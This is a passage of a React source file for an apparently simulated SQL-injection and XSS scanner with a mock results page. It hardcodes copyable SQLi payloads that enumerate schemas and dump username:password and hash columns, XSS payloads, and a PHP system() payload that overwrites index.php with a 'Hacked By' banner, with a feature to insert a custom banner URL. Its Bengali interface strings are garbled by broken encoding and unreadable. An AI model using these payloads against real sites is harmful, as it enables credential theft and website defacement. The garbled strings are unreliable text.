            dbmsVersion: '5.7.32',
            os: 'Linux'
          },
          fullDatabaseSchema: [ // New detailed schema with dumped data
            {
              name: 'web_app_db',
              tables: [
                {
                  name: 'users',
                  columns: ['id', 'username', 'password', 'email'],
                  dumpedData: [
                    { id: 1, username: 'admin', password: 'hashed_admin_pass_123', email: 'admin@example.com' },
                    { id: 2, username: 'user1', password: 'hashed_user1_pass_456', email: 'user1@example.com' },
                    { id: 3, username: 'testuser', password: 'hashed_test_pass_789', email: 'test@example.com' },
                  ]
                },
                {
                  name: 'products',
                  columns: ['product_id', 'name', 'description', 'price'],
                  dumpedData: [
                    { product_id: 101, name: 'Laptop', description: 'Gaming Laptop', price: 1200 },
                    { product_id: 102, name: 'Mouse', description: 'Wireless Mouse', price: 50 },
                  ]
                }
              ]
            },
            {
              name: 'users_db',
              tables: [
                {
                  name: 'credentials',
                  columns: ['user_id', 'hash', 'salt'],
                  dumpedData: [
                    { user_id: 1, hash: 'abc123def456', salt: 'salt1' },
                    { user_id: 2, hash: 'ghi789jkl012', salt: 'salt2' },
                  ]
                }
              ]
            },
            {
              name: 'information_schema', // Common for MySQL/MariaDB
              tables: [
                {
                  name: 'schemata',
                  columns: ['schema_name', 'default_character_set_name'],
                  dumpedData: [
                    { schema_name: 'web_app_db', default_character_set_name: 'utf8mb4' },
                    { schema_name: 'users_db', default_character_set_name: 'utf8mb4' },
                    { schema_name: 'information_schema', default_character_set_name: 'utf8' },
                  ]
                },
                // Add more tables if desired for simulation
              ]
            }
          ],
          xssVulnerable: true, // Simulated XSS vulnerability
          xssPayloadsFound: [
            { name: "Reflected XSS (Basic Script)", value: "<script>alert('XSSed!')</script>" },
            { name: "Reflected XSS (Image Error)", value: "<img src=x onerror=alert('XSS')>" },
            { name: "Reflected XSS (SVG Onload)", value: "<svg/onload=alert('XSS')>" }
          ],
          defacementPossible: true, // Simulated defacement possibility
          defacementMethod: "Remote Code Execution (RCE) via File Upload", // Simulated method
          defacementPayloadExample: "<?php system('echo \"<img src=\\'YOUR_BANNER_LINK\\'><h1>Hacked By BugHunter Lab</h1>\" > index.php'); ?>", // Simulated example payload
          payloads: [
            { name: "Basic Injection Probe (Single Quote)", value: "' OR 1=1--" },
            { name: "Basic Injection Probe (Double Quote)", value: "\" OR 1=1--" },
            { name: "Basic Injection Probe (Parenthesis)", value: "') OR '1'='1--" },
            { name: "Time-Based Blind SQLi (5s Delay)", value: "1' AND SLEEP(5)--" },
            { name: "Error-Based SQLi (MySQL/MariaDB)", value: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7178787171,(SELECT MID(IFNULL(CAST(schema_name AS CHAR),0x20),1,50) FROM information_schema.schemata LIMIT 0,1),0x717a7a7171,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--" },
            { name: "Union-Based Column Count (1-5)", value: "1 UNION SELECT NULL,NULL,NULL,NULL,NULL--" },
            { name: "Union-Based Vulnerable Columns (Example for 3 columns)", value: "-1 UNION SELECT 1,2,3--" },
            { name: "Database Enumeration (MySQL/MariaDB)", value: "-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--" },
            { name: "Table Enumeration (web_app_db)", value: "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='web_app_db'--" },
            { name: "Column Enumeration (web_app_db.users)", value: "-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='web_app_db' AND table_name='users'--" },
            { name: "Data Dump (web_app_db.users - username:password)", value: "-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM web_app_db.users--" },
            { name: "Data Dump (users_db.credentials - user_id:hash)", value: "-1 UNION SELECT 1,group_concat(user_id,0x3a,hash),3 FROM users_db.credentials--" },
            { name: "XSS Payload (Basic Script)", value: "<script>alert('XSS')</script>" },
            { name: "XSS Payload (Image Error)", value: "<img src=x onerror=alert('XSS')>" },
            { name: "XSS Payload (SVG Onload)", value: "<svg/onload=alert('XSS')>" },
            { name: "Defacement Payload (PHP RCE Example)", value: "<?php system('echo \"<img src=\\'YOUR_BANNER_LINK\\'><h1>Hacked By BugHunter Lab</h1>\" > index.php'); ?>" },
            { name: "System Info (@@version)", value: "-1 UNION SELECT 1,@@version,3--" }
          ],
          requestResponse: `
            Request:
            GET /product.php?id=1' OR 1=1-- HTTP/1.1
            Host: vuln-site.com
            User-Agent: BugHunterLab/1.0

            Response:
            HTTP/1.1 200 OK
            Content-Type: text/html
            ... (HTML content indicating success) ...
          `
        });
        navigateTo('report', { scanId });
      }
    }, 1000); // Simulate log generation every 1 second for faster demo
  };

  const handlePauseStop = () => {
    if (scanStatus === 'scanning') {
      clearInterval(scanIntervalRef.current);
      setScanStatus('paused');
      addLog("‡¶∏‡ßç‡¶ï‡ßç‡¶Ø‡¶æ‡¶® ‡¶¨‡¶ø‡¶∞‡¶§‡¶ø ‡¶¶‡ßá‡¶ì‡¶Ø‡¶º‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§", "info");
    } else if (scanStatus === 'paused') {
      setScanStatus('scanning');
      startScanSimulation();
      addLog("‡¶∏‡ßç‡¶ï‡ßç‡¶Ø‡¶æ‡¶® ‡¶™‡ßÅ‡¶®‡¶∞‡¶æ‡¶Ø‡¶º ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§", "info");
    } else if (scanStatus === 'completed' || scanStatus === 'error') {
      // Logic for stopping a completed scan (e.g., clear logs, reset state)
      clearInterval(scanIntervalRef.current);
      setScanLogs([]);
      setScanStatus('pending');
      setScanResult(null);
      setCurrentStep(0);
      navigateTo('landing');
      addLog("‡¶∏‡ßç‡¶ï‡ßç‡¶Ø‡¶æ‡¶® ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§", "info");
    }
  };

  const getLogIcon = (type) => {
    switch (type) {
      case 'info':
        return '‚ÑπÔ∏è';
      case 'success':
        return '‚úÖ';
      case 'warning':
        return '‚ö†Ô∏è';
      case 'error':
        return '‚ùå';
      case 'probe':
        return 'üîç';
      default:
        return 'üìù';
    }
  };

  const highlightPayload = (text) => {
    // Basic highlighting for common malicious SQLi chars
    const maliciousChars = /(['";`\-\=\+\(\)\*\/\\<>!@#$%^&\s])/g;
    return text.split(maliciousChars).map((part, index) => {
      if (maliciousChars.test(part)) {
        return <span key={index} className="text-[#f85149]">{part}</span>;
      }
      return part;
    });
  };

  return (
    <div className="w-full max-w-2xl bg-[#161b22] p-6 rounded-lg shadow-lg">
      <h2 className="text-2xl font-semibold mb-4 text-center">‡¶∏‡ßç‡¶ï‡ßç‡¶Ø‡¶æ‡¶® ‡¶ï‡¶®‡¶∏‡ßã‡¶≤</h2>
      <div className="mb-6 flex justify-between items-center">
        {stepMessages.map((msg, index) => (
          <div key={index} className={`flex-1 text-center ${index <= currentStep ? 'text-[#58a6ff]' : 'text-gray-500'}`}>
            <div className={`w-8 h-8 mx-auto rounded-full flex items-center justify-center font-bold mb-1 ${index <= currentStep ? 'bg-[#58a6ff] text-white' : 'bg-[#30363d]'}`}>
              {index + 1}
            </div>
            <p className="text-xs">{msg}</p>
          </div>
        ))}
      </div>

      <div className="bg-[#0d1117] p-4 rounded-md font-mono text-sm h-80 overflow-y-auto border border-[#30363d]" ref={logContainerRef}>
        {scanLogs.map((log, index) => (
          <p key={index} className={`mb-1 ${log.type === 'success' ? 'text-[#3fb950]' : log.type === 'warning' ? 'text-yellow-500' : log.type === 'error' ? 'text-[#f85149]' : 'text-gray-300'}`}>
            <span className="text-gray-500 mr-2">{log.timestamp}</span>
            <span className="mr-2">{getLogIcon(log.type)}</span>
            {log.message}
            {showRawPayloads && log.payload && (
              <span className="block ml-8 text-gray-400">
                ‡¶™‡ßá‡¶≤‡ßã‡¶°: <span className="text-gray-200">{highlightPayload(log.payload)}</span>
              </span>
            )}
          </p>
        ))}
      </div>

      <div className="mt-4 flex justify-between items-center">
        <button
          onClick={handlePauseStop}
          className={`py-2 px-4 rounded-md font-bold transition duration-200 ease-in-out ${
            scanStatus === 'scanning'
              ? 'bg-yellow-600 hover:bg-yellow-700 text-white'
              : scanStatus === 'paused'
              ? 'bg-[#3fb950] hover:bg-[#309e40] text-white'
              : 'bg-[#f85149] hover:bg-[#d4433c] text-white'
          }`}
          disabled={scanStatus === 'completed' || scanStatus === 'error'}
        >
          {scanStatus === 'scanning' ? 'Pause' : scanStatus === 'paused' ? 'Resume' : 'Stop'}
        </button>
        <div className="flex items-center">
          <span className="mr-2 text-gray-400">I‚Äôm Feeling Geeky</span>
          <input
            type="checkbox"
            className="form-checkbox h-5 w-5 text-[#58a6ff] rounded border-gray-300"
            checked={showRawPayloads}
            onChange={() => setShowRawPayloads(!showRawPayloads)}
          />
        </div>
        <button
          onClick={() => setScrollLock(!scrollLock)}
          className="py-2 px-4 bg-[#30363d] hover:bg-[#444b52] text-gray-200 rounded-md transition duration-200 ease-in-out"
        >
          {scrollLock ? 'Scroll Lock On' : 'Scroll Lock Off'}
        </button>
      </div>
    </div>
  );
};

// Results Page Component
const ResultsPage = ({ navigateTo, scanId, scanResult, setTargetUrl, setScanLogs, setScanStatus, setScanResult, setCurrentStep, setScanId }) => {
  const [activeTab, setActiveTab] = useState('payloads');
  const [showExportModal, setShowExportModal] = useState(false);
  const [exportFormat, setExportFormat] = useState('PDF');
  const [bannerUrl, setBannerUrl] = useState('https://placehold.co/600x100/f85149/ffffff?text=HACKED+BY+BUGHUNTER+LAB'); // Default banner URL

  if (!scanResult) {
    return (
      <div className="w-full max-w-md bg-[#161b22] p-6 rounded-lg shadow-lg text-center">
        <p className="text-lg text-gray-400">‡¶ï‡ßã‡¶®‡ßã ‡¶∏‡ßç‡¶ï‡ßç‡¶Ø‡¶æ‡¶® ‡¶´‡¶≤‡¶æ‡¶´‡¶≤ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø‡•§</p>
        <button
          onClick={() => navigateTo('landing')}
          className="mt-4 bg-[#58a6ff] hover:bg-[#448ee2] text-white font-bold py-2 px-4 rounded-md transition duration-200 ease-in-out"
        >
          ‡¶®‡¶§‡ßÅ‡¶® ‡¶∏‡ßç‡¶ï‡ßç‡¶Ø‡¶æ‡¶® ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡ßÅ‡¶®
        </button>
      </div>
    );
  }

  const getStatusColor = (status) => {
    switch (status) {
      case 'VULNERABLE':
        return 'bg-[#f85149]'; // Error color
      case 'POTENTIAL':
        return 'bg-yellow-500';
      case 'NOT VULNERABLE':
        return 'bg-[#3fb950]'; // Success color
      default:
        return 'bg-gray-500';
    }
  };

  const handleReScan = () => {
    // Reset all scan states and navigate back to scan console
    setScanLogs([]);
    setScanStatus('pending');
    setScanResult(null);
    setCurrentStep(0);
    setScanId(generateUUID()); // Generate new ID for re-scan
    navigateTo('scan');
  };

  const handleExport = () => {
    const filename = `${scanId}-${new Date().toISOString().slice(0, 10)}-${new Date().toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit' }).replace(/:/g, '-')}`;
    // Simulate export logic
    console.log(`Exporting scan ${scanId} as ${exportFormat} with filename: ${filename}`);
    // Using alert as per instruction, but typically a custom modal would be used.
    // For actual implementation, you'd trigger a backend endpoint to generate and download the report.
    alert(`‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü ${exportFormat} ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü‡ßá ‡¶è‡¶ï‡ßç‡¶∏‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá‡•§ ‡¶´‡¶æ‡¶á‡¶≤‡¶®‡ßá‡¶Æ: ${filename}`); 
    setShowExportModal(false);
  };

  const copyToClipboard = (text, message) => {
    navigator.clipboard.writeText(text);
    alert(message); // Using alert as per instruction
  };

  // Function to determine if a column is "vulnerable" for display purposes (simulated)
  const isVulnerableColumn = (dbName, tableName, colName) => {
    // For simulation, let's assume 'password' and 'email' columns in 'users' table are vulnerable.
    // In a real app, this would come from backend analysis.
    return (dbName === 'web_app_db' && tableName === 'users' && (colName === 'password' || colName === 'email')) ||
           (dbName === 'users_db' && tableName === 'credentials' && colName === 'hash');
  };

  const generateDefacementPayloadWithBanner = () => {
    // Replace placeholder with actual banner URL in the simulated payload
    return scanResult.defacementPayloadExample.replace('YOUR_BANNER_LINK', bannerUrl);
  };

  return (
    <div className="w-full max-w-2xl bg-[#161b22] p-6 rounded-lg shadow-lg">
      <h2 className="text-2xl font-semibold mb-4 text-center">‡¶∏‡ßç‡¶ï‡ßç‡¶Ø‡¶æ‡¶® ‡¶´‡¶≤‡¶æ‡¶´‡¶≤</h2>

      {/* Summary Card */}
      <div className="bg-[#0d1117] p-4 rounded-md border border-[#30363d] mb-6">
        <div className="flex items-center justify-between mb-3">
          <span className={`px-3 py-1 rounded-full text-white font-bold ${getStatusColor(scanResult.status)}`}>
            {scanResult.status === 'VULNERABLE' ? '‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤' : scanResult.status === 'NOT VULNERABLE' ? '‡¶∏‡ßÅ‡¶∞‡¶ï‡ßç‡¶∑‡¶ø‡¶§' : '‡¶∏‡¶Æ‡ßç‡¶≠‡¶æ‡¶¨‡ßç‡¶Ø'}
          </span>
          <span className="text-sm text-gray-400">‡¶∏‡ßç‡¶ï‡ßç‡¶Ø‡¶æ‡¶® ID: {scanId}</span>
        </div>
        <p className="text-lg mb-2">‡¶ï‡¶≤‡¶æ‡¶Æ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ: <span className="font-bold text-[#58a6ff]">{scanResult.columnCount}</span></p>
        <p className="text-lg">‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤ ‡¶ï‡¶≤‡¶æ‡¶Æ:
          {scanResult.vulnerableColumns.length > 0 ? (
            scanResult.vulnerableColumns.map((col, index) => (
              <span key={index} className="inline-block bg-[#f85149] text-white text-xs px-2 py-1 rounded-full ml-2">
                {col}
              </span>
            ))
          ) : (
            <span className="ml-2 text-gray-400">‡¶ï‡ßã‡¶®‡ßã ‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤ ‡¶ï‡¶≤‡¶æ‡¶Æ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø‡•§</span>
          )}
        </p>
        {scanResult.status === 'NOT VULNERABLE' && (
          <p className="text-[#3fb950] mt-4 text-center">No SQLi detected this time ‚Äî but keep testing! 0-day happens.</p>
        )}
      </div>

      {/* Tabs Section */}
      <div className="mb-4">
        <div className="flex border-b border-[#30363d]">
          <button
            className={`flex-1 py-2 text-center font-semibold ${activeTab === 'payloads' ? 'border-b-2 border-[#58a6ff] text-[#58a6ff]' : 'text-gray-400 hover:text-gray-200'}`}
            onClick={() => setActiveTab('payloads')}
          >
            ‡¶™‡ßá‡¶≤‡ßã‡¶°‡¶∏
          </button>
          <button
            className={`flex-1 py-2 text-center font-semibold ${activeTab === 'requestResponse' ? 'border-b-2 border-[#58a6ff] text-[#58a6ff]' : 'text-gray-400 hover:text-gray-200'}`}
            onClick={() => setActiveTab('requestResponse')}
          >
            ‡¶∞‡¶ø‡¶ï‡ßã‡¶Ø‡¶º‡ßá‡¶∏‡ßç‡¶ü/‡¶∞‡ßá‡¶∏‡¶™‡¶®‡ßç‡¶∏
          </button>
          <button
            className={`flex-1 py-2 text-center font-semibold ${activeTab === 'dbSystemInfo' ? 'border-b-2 border-[#58a6ff] text-[#58a6ff]' : 'text-gray-400 hover:text-gray-200'}`}
            onClick={() => setActiveTab('dbSystemInfo')}
          >
            ‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú ‡¶ì ‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ‡¶§‡¶•‡ßç‡¶Ø
          </button>
        </div>
        <div className="mt-4 bg-[#0d1117] p-4 rounded-md border border-[#30363d] font-mono text-sm">
          {activeTab === 'payloads' && (
            <div>
              {scanResult.payloads.map((p, index) => (
                <div key={index} className="mb-3 p-2 bg-[#161b22] rounded-md flex justify-between items-center">
                  <div>
                    <p className="text-gray-400 text-xs">{p.name}:</p>
                    <p className="text-gray-200 break-all">{p.value}</p>
                  </div>
                  <button
                    onClick={() => copyToClipboard(p.value, '‡¶™‡ßá‡¶≤‡ßã‡¶° ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!')}
                    className="ml-4 bg-[#30363d] hover:bg-[#444b52] text-gray-200 px-3 py-1 rounded-md text-xs"
                  >
                    ‡¶ï‡¶™‡¶ø
                  </button>
                </div>
              ))}
            </div>
          )}
          {activeTab === 'requestResponse' && (
            <pre className="whitespace-pre-wrap text-gray-200">
              {scanResult.requestResponse}
            </pre>
          )}
          {activeTab === 'dbSystemInfo' && (
            <div>
              <h3 className="text-lg font-semibold mb-3 text-[#58a6ff]">‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ‡¶∏‡¶Æ‡ßÇ‡¶π:</h3>
              {scanResult.databaseNames && scanResult.databaseNames.length > 0 ? (
                <ul className="list-disc list-inside mb-4">
                  {scanResult.databaseNames.map((dbName, index) => (
                    <li key={index} className="flex justify-between items-center mb-1">
                      <span className="text-gray-200">{dbName}</span>
                      <button
                        onClick={() => copyToClipboard(dbName, '‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!')}
                        className="ml-4 bg-[#30363d] hover:bg-[#444b52] text-gray-200 px-3 py-1 rounded-md text-xs"
                      >
                        ‡¶ï‡¶™‡¶ø
                      </button>
                    </li>
                  ))}
                </ul>
              ) : (
                <p className="text-gray-400">‡¶ï‡ßã‡¶®‡ßã ‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø‡•§</p>
              )}

              <h3 className="text-lg font-semibold mb-3 text-[#58a6ff] mt-6">‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ‡¶§‡¶•‡ßç‡¶Ø:</h3>
              {scanResult.systemInfo ? (
                <div className="space-y-2">
                  <div className="flex justify-between items-center">
                    <span className="text-gray-400">DBMS:</span>
                    <span className="text-gray-200">{scanResult.systemInfo.dbms}</span>
                    <button
                      onClick={() => copyToClipboard(scanResult.systemInfo.dbms, 'DBMS ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!')}
                      className="ml-4 bg-[#30363d] hover:bg-[#444b52] text-gray-200 px-3 py-1 rounded-md text-xs"
                    >
                      ‡¶ï‡¶™‡¶ø
                    </button>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-400">DBMS ‡¶∏‡¶Ç‡¶∏‡ßç‡¶ï‡¶∞‡¶£:</span>
                    <span className="text-gray-200">{scanResult.systemInfo.dbmsVersion}</span>
                    <button
                      onClick={() => copyToClipboard(scanResult.systemInfo.dbmsVersion, 'DBMS ‡¶∏‡¶Ç‡¶∏‡ßç‡¶ï‡¶∞‡¶£ ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!')}
                      className="ml-4 bg-[#30363d] hover:bg-[#444b52] text-gray-200 px-3 py-1 rounded-md text-xs"
                    >
                      ‡¶ï‡¶™‡¶ø
                    </button>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-400">‡¶Ö‡¶™‡¶æ‡¶∞‡ßá‡¶ü‡¶ø‡¶Ç ‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ:</span>
                    <span className="text-gray-200">{scanResult.systemInfo.os}</span>
                    <button
                      onClick={() => copyToClipboard(scanResult.systemInfo.os, 'OS ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!')}
                      className="ml-4 bg-[#30363d] hover:bg-[#444b52] text-gray-200 px-3 py-1 rounded-md text-xs"
                    >
                      ‡¶ï‡¶™‡¶ø
                    </button>
                  </div>
                </div>
              ) : (
                <p className="text-gray-400">‡¶ï‡ßã‡¶®‡ßã ‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ‡¶§‡¶•‡ßç‡¶Ø ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø‡•§</p>
              )}

              <h3 className="text-lg font-semibold mb-3 text-[#58a6ff] mt-6">‡¶∏‡¶Æ‡ßç‡¶™‡ßÇ‡¶∞‡ßç‡¶£ ‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú ‡¶∏‡ßç‡¶ï‡¶ø‡¶Æ‡¶æ ‡¶ì ‡¶°‡ßá‡¶ü‡¶æ:</h3>
              {scanResult.fullDatabaseSchema && scanResult.fullDatabaseSchema.length > 0 ? (
                <div className="space-y-4">
                  {scanResult.fullDatabaseSchema.map((db, dbIndex) => (
                    <div key={dbIndex} className="bg-[#161b22] p-3 rounded-md border border-[#30363d]">
                      <div className="flex justify-between items-center mb-2">
                        <span className="text-base font-bold text-[#58a6ff]">{db.name} (‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú)</span>
                        <button
                          onClick={() => copyToClipboard(db.name, `‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú "${db.name}" ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!`)}
                          className="ml-4 bg-[#30363d] hover:bg-[#444b52] text-gray-200 px-3 py-1 rounded-md text-xs"
                        >
                          ‡¶ï‡¶™‡¶ø
                        </button>
                      </div>
                      {db.tables && db.tables.length > 0 ? (
                        <ul className="ml-4 space-y-3">
                          {db.tables.map((table, tableIndex) => (
                            <li key={tableIndex} className="bg-[#0d1117] p-2 rounded-md border border-[#30363d]">
                              <div className="flex justify-between items-center mb-1">
                                <span className="text-sm font-semibold text-gray-300">{table.name} (‡¶ü‡ßá‡¶¨‡¶ø‡¶≤)</span>
                                <button
                                  onClick={() => copyToClipboard(table.name, `‡¶ü‡ßá‡¶¨‡¶ø‡¶≤ "${table.name}" ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!`)}
                                  className="ml-4 bg-[#30363d] hover:bg-[#444b52] text-gray-200 px-3 py-1 rounded-md text-xs"
                                >
                                  ‡¶ï‡¶™‡¶ø
                                </button>
                              </div>
                              {table.columns && table.columns.length > 0 ? (
                                <ul className="ml-4 list-disc list-inside text-gray-400 mb-2">
                                  {table.columns.map((col, colIndex) => (
                                    <li key={colIndex} className="flex justify-between items-center">
                                      <span className={`text-xs ${isVulnerableColumn(db.name, table.name, col) ? 'text-[#f85149] font-bold' : ''}`}>
                                        {col} (‡¶ï‡¶≤‡¶æ‡¶Æ) {isVulnerableColumn(db.name, table.name, col) && '‚ö†Ô∏è ‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤‡¶§‡¶æ ‡¶∏‡¶Æ‡ßç‡¶≠‡¶æ‡¶¨‡ßç‡¶Ø'}
                                      </span>
                                      <button
                                        onClick={() => copyToClipboard(col, `‡¶ï‡¶≤‡¶æ‡¶Æ "${col}" ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!`)}
                                        className="ml-4 bg-[#30363d] hover:bg-[#444b52] text-gray-200 px-3 py-1 rounded-md text-xs"
                                      >
                                        ‡¶ï‡¶™‡¶ø
                                      </button>
                                    </li>
                                  ))}
                                </ul>
                              ) : (
                                <p className="text-gray-500 text-xs ml-4">‡¶ï‡ßã‡¶®‡ßã ‡¶ï‡¶≤‡¶æ‡¶Æ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø‡•§</p>
                              )}

                              {table.dumpedData && table.dumpedData.length > 0 && (
                                <div className="mt-4 border-t border-[#30363d] pt-3">
                                  <h4 className="text-sm font-semibold mb-2 text-gray-300">‡¶°‡¶æ‡¶Æ‡ßç‡¶™ ‡¶ï‡¶∞‡¶æ ‡¶°‡ßá‡¶ü‡¶æ:</h4>
                                  <div className="overflow-x-auto">
                                    <table className="w-full text-xs text-left text-gray-400">
                                      <thead className="text-gray-200 uppercase bg-[#0d1117]">
                                        <tr>
                                          {table.columns.map((col, colIndex) => (
                                            <th key={colIndex} scope="col" className="px-2 py-1">
                                              {col}
                                            </th>
                                          ))}
                                        </tr>
                                      </thead>
                                      <tbody>
                                        {table.dumpedData.map((row, rowIndex) => (
                                          <tr key={rowIndex} className="bg-[#161b22] border-b border-[#30363d]">
                                            {table.columns.map((col, colIndex) => (
                                              <td key={colIndex} className="px-2 py-1 whitespace-nowrap">
                                                {row[col]}
                                              </td>
                                            ))}
                                          </tr>
                                        ))}
                                      </tbody>
                                    </table>
                                  </div>
                                  <button
                                    onClick={() => copyToClipboard(JSON.stringify(table.dumpedData, null, 2), `‡¶ü‡ßá‡¶¨‡¶ø‡¶≤ "${table.name}" ‡¶è‡¶∞ ‡¶°‡ßá‡¶ü‡¶æ ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!`)}
                                    className="mt-2 bg-[#30363d] hover:bg-[#444b52] text-gray-200 px-3 py-1 rounded-md text-xs w-full"
                                  >
                                    ‡¶∏‡¶Æ‡ßç‡¶™‡ßÇ‡¶∞‡ßç‡¶£ ‡¶°‡ßá‡¶ü‡¶æ ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®
                                  </button>
                                </div>
                              )}
                            </li>
                          ))}
                        </ul>
                      ) : (
                        <p className="text-gray-500 text-sm ml-4">‡¶ï‡ßã‡¶®‡ßã ‡¶ü‡ßá‡¶¨‡¶ø‡¶≤ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø‡•§</p>
                      )}
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-gray-400">‡¶ï‡ßã‡¶®‡ßã ‡¶°‡ßá‡¶ü‡¶æ‡¶¨‡ßá‡¶ú ‡¶∏‡ßç‡¶ï‡¶ø‡¶Æ‡¶æ ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø‡•§</p>
              )}

              {/* XSS Vulnerability Section */}
              <h3 className="text-lg font-semibold mb-3 text-[#58a6ff] mt-6">Cross-Site Scripting (XSS) ‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤‡¶§‡¶æ:</h3>
              {scanResult.xssVulnerable ? (
                <div className="bg-[#161b22] p-3 rounded-md border border-[#f85149]">
                  <p className="text-[#f85149] font-bold mb-2">‚ö†Ô∏è XSS ‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤‡¶§‡¶æ ‡¶∏‡¶®‡¶æ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!</p>
                  <p className="text-gray-300 mb-2">‡¶è‡¶á ‡¶∏‡¶æ‡¶á‡¶ü‡ßá XSS ‡¶¶‡ßÅ‡¶∞‡ßç‡¶¨‡¶≤‡¶§‡¶æ ‡¶∞‡¶Ø‡¶º‡ßá‡¶õ‡ßá, ‡¶Ø‡¶æ ‡¶Ü‡¶ï‡ßç‡¶∞‡¶Æ‡¶£‡¶ï‡¶æ‡¶∞‡ßÄ‡¶ï‡ßá ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡¶ï‡¶æ‡¶∞‡ßÄ‡¶∞ ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞‡ßá ‡¶ï‡ßç‡¶∑‡¶§‡¶ø‡¶ï‡¶æ‡¶∞‡¶ï ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶™‡ßç‡¶ü ‡¶á‡¶®‡¶ú‡ßá‡¶ï‡ßç‡¶ü ‡¶ï‡¶∞‡¶§‡ßá ‡¶∏‡¶æ‡¶π‡¶æ‡¶Ø‡ßç‡¶Ø ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡•§</p>
